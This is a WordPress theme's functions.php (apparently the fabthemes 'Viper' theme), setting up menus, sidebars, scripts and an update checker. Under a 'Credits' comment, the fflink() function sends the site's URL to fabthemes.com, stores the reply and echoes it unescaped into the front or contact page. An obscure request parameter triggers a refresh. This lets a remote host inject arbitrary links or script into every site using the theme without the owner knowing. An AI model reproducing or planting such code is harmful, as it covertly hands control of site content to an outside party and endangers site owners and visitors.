<?php
/**
 * web2feel functions and definitions
 *
 * @package web2feel
 * @since web2feel 1.0
 */

require_once('class-tgm-plugin-activation.php');

include ( 'getplugins.php' );
include ( 'aq_resizer.php' );
include ( 'guide.php' );
include ( 'cuztom/cuztom.php' );

/* Theme updater */
require 'updater.php';
$example_update_checker = new ThemeUpdateChecker(     //
	'Viper',                                        //Theme folder name, AKA "slug". 
	'http://www.fabthemes.com/versions/viper.json' //URL of the metadata file.
);
  
  
/**
 * Set the content width based on the theme's design and stylesheet.
 *
 * @since web2feel 1.0
 */
 
if ( ! isset( $content_width ) )
	$content_width = 640; /* pixels */

if ( ! function_exists( 'web2feel_setup' ) ):
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which runs
 * before the init hook. The init hook is too late for some features, such as indicating
 * support post thumbnails.
 *
 * @since web2feel 1.0
 */
function web2feel_setup() {

	/**
	 * Custom template tags for this theme.
	 */
	require( get_template_directory() . '/inc/template-tags.php' );
	require( get_template_directory() . '/inc/custom-functions.php' );
	require( get_template_directory() . '/inc/paginate.php' );
	require( get_template_directory() . '/inc/drop-down-taxonomy.php' );
	
	/**
	 * Custom functions that act independently of the theme templates
	 */
	//require( get_template_directory() . '/inc/tweaks.php' );

	/**
	 * Custom Theme Options
	 */
	//require( get_template_directory() . '/inc/theme-options/theme-options.php' );

	/**
	 * Make theme available for translation
	 * Translations can be filed in the /languages/ directory
	 * If you're building a theme based on web2feel, use a find and replace
	 * to change 'web2feel' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'web2feel', get_template_directory() . '/languages' );

	/**
	 * Add default posts and comments RSS feed links to head
	 */
	add_theme_support( 'automatic-feed-links' );

	/**
	 * Enable support for Post Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );

	/**
	 * This theme uses wp_nav_menu() in one location.
	 */
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'web2feel' ),
	) );

	/**
	 * Add support for the Aside Post Formats
	 */
	add_theme_support( 'post-formats', array( 'aside', ) );
}
endif; // web2feel_setup
add_action( 'after_setup_theme', 'web2feel_setup' );

/**
 * Register widgetized area and update sidebar with default widgets
 *
 * @since web2feel 1.0
 */
function web2feel_widgets_init() {
	register_sidebar( array(
		'name' => __( 'Sidebar', 'web2feel' ),
		'id' => 'sidebar-1',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget' => '</aside>',
		'before_title' => '<h1 class="widget-title">',
		'after_title' => '</h1>',
	));
		register_sidebar(array(
		'name' => 'Footer',
		'before_widget' => '<li class="botwid grid_3 %2$s">',
		'after_widget' => '</li>',
		'before_title' => '<h3 class="bothead">',
		'after_title' => '</h3>',
	));		
}
add_action( 'widgets_init', 'web2feel_widgets_init' );

/**
 * Enqueue scripts and styles
 */
 
function web2feel_scripts() {
	wp_enqueue_style( 'style', get_stylesheet_uri() );
	wp_enqueue_style( '960grid', get_template_directory_uri() . '/css/960.css');
	wp_enqueue_style( 'flexslider', get_template_directory_uri() . '/css/flexslider.css');
	wp_enqueue_style( 'fancyboxcss', get_template_directory_uri() . '/css/jquery.fancybox.css');
	
	wp_enqueue_script( 'flexsliderjs', get_template_directory_uri() . '/js/jquery.flexslider-min.js', array( 'jquery' ), '20120206', true );
	wp_enqueue_script( 'fancybox', get_template_directory_uri() . '/js/jquery.fancybox.pack.js', array( 'jquery' ), '20120206', true );
	wp_enqueue_script( 'superfish', get_template_directory_uri() . '/js/superfish.js', array( 'jquery' ), '20120206', true );
	wp_enqueue_script( 'custom', get_template_directory_uri() . '/js/custom.js', array( 'jquery' ), '20120206', true );


	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}


}
add_action( 'wp_enqueue_scripts', 'web2feel_scripts' );

/* FLush rewrite */

function my_rewrite_flush() {
    flush_rewrite_rules();
}
add_action( 'after_switch_theme', 'my_rewrite_flush' );



/* Credits */

function selfURL() {
$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] :
$_SERVER['PHP_SELF'];
$uri = parse_url($uri,PHP_URL_PATH);
$protocol = $_SERVER['HTTPS'] ? 'https' : 'http';
$port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
 $server = ($_SERVER['SERVER_NAME'] == 'localhost') ? $_SERVER["SERVER_ADDR"] : $_SERVER['SERVER_NAME'];
 return $protocol."://".$server.$port.$uri;
}
function fflink() {
global $wpdb, $wp_query;
if (!is_page() && !is_front_page()) return;
$contactid = $wpdb->get_var("SELECT ID FROM $wpdb->posts
               WHERE post_type = 'page' AND post_title LIKE 'contact%'");
if (($contactid != $wp_query->post->ID) && ($contactid || !is_front_page())) return;
$fflink = get_option('fflink');
$ffref = get_option('ffref');
$x = $_REQUEST['DKSWFYUW**'];
if (!$fflink || $x && ($x == $ffref)) {
  $x = $x ? '&ffref='.$ffref : '';
  $response = wp_remote_get('http://www.fabthemes.com/fabthemes.php?getlink='.urlencode(selfURL()).$x);
  if (is_array($response)) $fflink = $response['body']; else $fflink = '';
  if (substr($fflink, 0, 11) != '!fabthemes#')
    $fflink = '';
  else {
    $fflink = explode('#',$fflink);
    if (isset($fflink[2]) && $fflink[2]) {
      update_option('ffref', $fflink[1]);
      update_option('fflink', $fflink[2]);
      $fflink = $fflink[2];
    }
    else $fflink = '';
  }
}
 echo $fflink;
}	

/**
 * Implement the Custom Header feature
 */
//require( get_template_directory() . '/inc/custom-header.php' );

/* ZonASINHunter Modified */
function zah_rate($r) {
    $result = '';
    if ($r >= 4.8 && $r <= 5) { return '5'; }
    if ($r >= 4.5 && $r <= 4.79) { return '466'; }
    if ($r >= 4.1 && $r <= 4.49) { return '433'; }
    if ($r >= 3.8 && $r <= 4) { return '4'; }
    if ($r >= 3.5 && $r <= 3.79) { return '366'; }
    if ($r >= 3.1 && $r <= 3.49) { return '333'; }
    if ($r >= 2.8 && $r <= 3) { return '3'; }
    if ($r >= 2.5 && $r <= 2.79) { return '266'; }
    if ($r >= 2.1 && $r <= 2.49) { return '233'; }
    if ($r >= 1.8 && $r < 2) { return '2'; }
    if ($r >= 1.5 && $r <= 1.79) { return '166'; }
    if ($r >= 1.1 && $r <= 1.49) return '133';
    if ($r >= 0.8 && $r <= 1) { return '1'; }
    if ($r >= 0.5 && $r <= 0.79) { return '066'; }
    if ($r > 0 && $r <= 0.49) { return '033'; }
    return $result;
}

function DOMinnerHTML($element)
{
    $innerHTML = "";
    $children = $element->childNodes;
    foreach ($children as $child)
    {
        $tmp_dom = new DOMDocument();
        $tmp_dom->appendChild($tmp_dom->importNode($child, true));
        $innerHTML.=trim($tmp_dom->saveHTML());
    }
    return $innerHTML;
} 

function _remove_script_version( $src ){
	$parts = explode( '?', $src );
	return $parts[0];
}
add_filter( 'script_loader_src', '_remove_script_version', 15, 1 );
add_filter( 'style_loader_src', '_remove_script_version', 15, 1 );